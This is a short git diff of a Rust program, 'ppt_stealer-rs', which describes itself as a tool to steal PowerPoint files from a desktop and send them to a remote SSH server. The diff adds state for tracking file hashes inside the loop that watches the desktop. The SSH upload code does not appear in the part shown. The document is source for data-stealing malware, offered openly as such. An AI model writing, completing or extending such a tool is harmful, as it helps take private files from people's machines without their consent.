@@ -1,6 +1,7 @@
 use clap::{Parser, ArgGroup};
 use log;
 use env_logger;
+use std::collections::HashMap;
 use std::thread::sleep;
 use std::time::Duration;
 use std::{self, str::FromStr};
@@ -10,7 +11,7 @@ mod watch_dog;
 
 #[derive(Parser, Debug)]
 #[command(name = "ppt_stealer-rs", version = "0.1")]
-#[command(about = "A tool to steal PowerPoint files from desktop", long_about = None)]
+#[command(about = "A tool to steal PowerPoint files from desktop to remote SSH server.", long_about = None)]
 #[command(group(
     ArgGroup::new("auth")
         .args(&["password", "key_auth"])
@@ -89,12 +90,15 @@ fn no_gui(desktop_path: &Path, args: Cli) {
     log::info!("No GUI mode on.");
 
     log::info!("Start monitering files...");
+
+    let file_hashes: HashMap<&Path, String> = HashMap::new();
+
     loop {
         let path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);
 
         let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();
 
-        let _ = watch_dog::get_hashes(&paths);
+        let new_file_hashes = watch_dog::get_hashes(&paths);
         
         sleep(Duration::from_secs(args.refresh_interval));
     }
